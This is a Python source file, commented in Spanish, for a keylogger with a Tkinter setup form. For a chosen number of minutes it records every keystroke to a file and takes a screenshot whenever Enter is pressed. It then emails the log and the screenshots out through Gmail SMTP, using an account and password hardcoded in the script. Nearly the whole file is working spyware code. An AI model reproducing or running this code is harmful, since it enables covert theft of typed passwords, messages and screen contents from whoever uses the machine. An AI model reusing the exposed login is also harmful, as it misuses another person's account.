from tkinter import *
from pynput.keyboard import Listener
import smtplib
import random
import string
import pyautogui
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.encoders import encode_base64
import signal
from contextlib import contextmanager


#Funciones para el menú (EN VEZ DE PRINT OTRO, QUE SEA PARA INICIAR CRONOMETRO)
def nombre_img(longitud):
    letra = string.ascii_lowercase
    return ''.join(random.choice(letra) for i in range(longitud))

def bubbleSort(lista):
    for i in range(len(lista)-1,0,-1):
        for j in range(0,i):
            if(lista[j][1] < lista[j+1][1]):
                aux = lista[j]
                lista[j]=lista[j+1]
                lista[j+1]=aux

def e_cronologico():
    ventana.destroy()
    n = str(nombre.get())
    c = correo.get()
    a = asunto.get()
    t = int(tiempo.get())
    n_img = ""
    listad_img = []
    def write_to_file(key):

        letter = str(key)
        letter = letter.replace("'", "")
        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == "Key.ctrl_l":
            letter = ""
        if letter == "Key.enter":
            letter = "\n"
            pyautogui.sleep(1)
            num_img = nombre_img(7)
            pyautogui.screenshot(num_img + ".png")
            n_img = str(num_img + ".png")
            listad_img.append(n_img)
        with open(n, 'a') as f:
            f.write(letter)

    # Recolectando eventos hasta parar.
    def txt():
        with Listener(on_press=write_to_file) as l:
            l.join()
    class TimeoutException(Exception): pass
    @contextmanager
    def time_limit(seconds):
        def signal_handler(signum, frame):
            raise TimeoutException("Timed out!")
        signal.signal(signal.SIGALRM, signal_handler)
        signal.alarm(seconds)
        try:
            yield
        finally:
            signal.alarm(0)
    try:
        with time_limit(t*60):
            txt()
    except TimeoutException as e:
        print("Timed out!")
    # ENVIO DE LAS IMAGENES (al ser cronologico, solo se debe acceder a su Dirección, porque se enlista de acuerdo al orden de llegada)
        #se recolecta la direccion y tamaño de las imagenes:
    dic_img = {}
    for i in listad_img:
        ruta = os.path.abspath(i)
        size = os.path.getsize(ruta)
        dic_img[ruta] = size
    listao = list(dic_img.items()) #lista de las iamgenes con direccion y tamaño

    #a la lista "listao" se le agrega al ultimo el archivo txt con su dirección
    ruta_t = os.path.abspath(n)
    tupla_t = (n,ruta_t)
    listao.append(tupla_t)

    #se adjunta el correo que se enviara:
    for i in range (len(listao)):
        archivo = listao[i][0]

        mensaje = MIMEMultipart("KEYLOGGER")
        mensaje["From"] = "prof.rob.automatico@gmail.com"
        mensaje["To"] = c
        mensaje["Subject"] = a

        if (os.path.isfile(archivo)):
            adjunto = MIMEBase('application', 'octet-stream')
            adjunto.set_payload(open(archivo, "rb").read())
            encode_base64(adjunto)
            adjunto.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(archivo))
            mensaje.attach(adjunto)

        smtp = smtplib.SMTP("smtp.gmail.com")
        smtp.starttls()
        smtp.login("prof.rob.automatico@gmail.com", "ROB12345%")
        smtp.sendmail("prof.rob.automatico@gmail.com", c, mensaje.as_string())
        smtp.quit()

def e_tama():
    ventana.destroy()
    n1 = str(nombre.get())
    c1 = correo.get()
    a1 = asunto.get()
    t1 = int(tiempo.get())
    n_img = ""
    listad_img = []
    def write_to_file(key):
        global n_img
        letter = str(key)
        letter = letter.replace("'", "")

        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == "Key.ctrl_l":
            letter = ""
        if letter == "Key.enter":
            letter = "\n"
            pyautogui.sleep(1)
            num_img = nombre_img(7)
            pyautogui.screenshot(num_img + ".png")
            n_img = str(num_img + ".png")
            listad_img.append(n_img)
        with open(n1, 'a') as f:
            f.write(letter)

    # Recolectando eventos hasta parar
    def txt():
        with Listener(on_press=write_to_file) as l:
            l.join()
    class TimeoutException(Exception): pass
    @contextmanager
    def time_limit(seconds):
        def signal_handler(signum, frame):
            raise TimeoutException("Timed out!")
        signal.signal(signal.SIGALRM, signal_handler)
        signal.alarm(seconds)
        try:
            yield
        finally:
            signal.alarm(0)
    try:
        with time_limit(t1*60):
            txt()
    except TimeoutException as e:
        print("Timed out!")
    #ORDENAR LA LISTA DE LAS imagenes
    dic_img = {}
    for i in listad_img:
        ruta = os.path.abspath(i)
        size = os.path.getsize(ruta)
        dic_img[ruta] = size

    listao = list(dic_img.items())
    bubbleSort(listao) #lista ordenada
    # a la lista "listao" se le agrega al ultimo el archivo txt con su dirección
    ruta_t = os.path.abspath(n1)
    tupla_t = (n1, ruta_t)
    listao.append(tupla_t)

    # se adjunta el correo que se enviara:
    for i in range(len(listao)):
        archivo = listao[i][0]

        mensaje = MIMEMultipart("KEYLOGGER")
        mensaje["From"] = "prof.rob.automatico@gmail.com"
        mensaje["To"] = c1
        mensaje["Subject"] = a1

        if (os.path.isfile(archivo)):
            adjunto = MIMEBase('application', 'octet-stream')
            adjunto.set_payload(open(archivo, "rb").read())
            encode_base64(adjunto)
            adjunto.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(archivo))
            mensaje.attach(adjunto)

        smtp = smtplib.SMTP("smtp.gmail.com")
        smtp.starttls()
        smtp.login("prof.rob.automatico@gmail.com", "ROB12345%")
        smtp.sendmail("prof.rob.automatico@gmail.com", c1, mensaje.as_string())
        smtp.quit()


#Esto es el menú que le pedirá al usuario los datos
ventana = Tk()
ventana.geometry("400x450")
ventana.title("Formulario de Datos")
encabezado = Label(text = "Formulario de Datos", bg = "black", fg = "white", width = "400", height = "2" )
encabezado.pack()

nombre_t = Label(text = "NOMBRE COMPLETO + .txt: <nombreapellido.txt>")
correo_t = Label(text = "PARA: <ejemplo@gmail.com>")
asunto_t = Label(text = "ASUNTO DEL CORREO:")
tiempo_t = Label(text = "TIEMPO DE EJECUCIÓN: (min)")
nombre_t.place(x = 15, y = 70)
correo_t.place(x = 15, y = 140)
asunto_t.place(x = 15, y = 210)
tiempo_t.place(x = 15, y = 280)

nombre = StringVar()
correo = StringVar()
asunto = StringVar()
tiempo = StringVar()

nombre_e = Entry(textvariable = nombre, width = "50")
correo_e = Entry(textvariable = correo, width = "50")
asunto_e = Entry(textvariable = asunto, width = "50")
tiempo_e = Entry(textvariable = tiempo, width = "50")

nombre_e.place(x = 15, y = 100)
correo_e.place(x = 15, y = 170)
asunto_e.place(x = 15, y = 240)
tiempo_e.place(x = 15, y = 310)

cronologico= Button(text = "CRONOLÓGICO", width = "20", height = "2", command = e_cronologico, bg = "black", fg = "white")
cronologico.place(x = 40, y = 380)

size = Button(text = "TAMAÑO", width = "20", height = "2", command = e_tama, bg = "black", fg = "white")
size.place(x = 220, y = 380)

ventana.mainloop()




